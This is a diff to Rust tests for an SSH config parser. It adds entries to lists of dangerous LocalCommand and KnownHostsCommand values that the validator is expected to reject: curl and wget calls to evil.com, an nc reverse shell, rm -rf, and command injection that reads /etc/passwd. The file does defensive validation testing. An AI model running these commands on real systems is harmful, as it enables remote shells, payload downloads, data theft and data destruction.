@@ -96,6 +96,10 @@ fn test_parse_local_command_security() {
         "LocalCommand echo test | grep foo",
         "LocalCommand echo test > /tmp/out",
         "LocalCommand echo test & echo background",
+        "LocalCommand curl https://evil.com/malware -o /tmp/malware",
+        "LocalCommand wget https://evil.com/steal-data",
+        "LocalCommand nc -e /bin/sh evil.com 1234",
+        "LocalCommand rm -rf /important/data",
     ];
 
     for cmd in dangerous_commands {
@@ -177,7 +181,7 @@ Host test2
     KnownHostsCommand /opt/scripts/get_key.sh %h
 
 Host test3
-    KnownHostsCommand curl -s https://ca.example.com/hostkey/%H
+    KnownHostsCommand /usr/bin/ssh-keyscan -H %H
 "#;
 
     let config_parsed = SshConfig::parse(config).unwrap();
@@ -192,7 +196,10 @@ Host test3
         hosts[1].known_hosts_command,
         Some("/opt/scripts/get_key.sh %h".to_string())
     );
-    // Note: curl command will fail validation due to security checks
+    assert_eq!(
+        hosts[2].known_hosts_command,
+        Some("/usr/bin/ssh-keyscan -H %H".to_string())
+    );
 }
 
 #[test]
@@ -202,6 +209,9 @@ fn test_parse_known_hosts_command_security() {
         "KnownHostsCommand echo test; cat /etc/passwd",
         "KnownHostsCommand echo $(whoami)",
         "KnownHostsCommand echo test | tee /tmp/log",
+        "KnownHostsCommand curl -s https://evil.com/hostkey",
+        "KnownHostsCommand wget https://evil.com/malware",
+        "KnownHostsCommand nc evil.com 1234",
     ];
 
     for cmd in dangerous_commands {
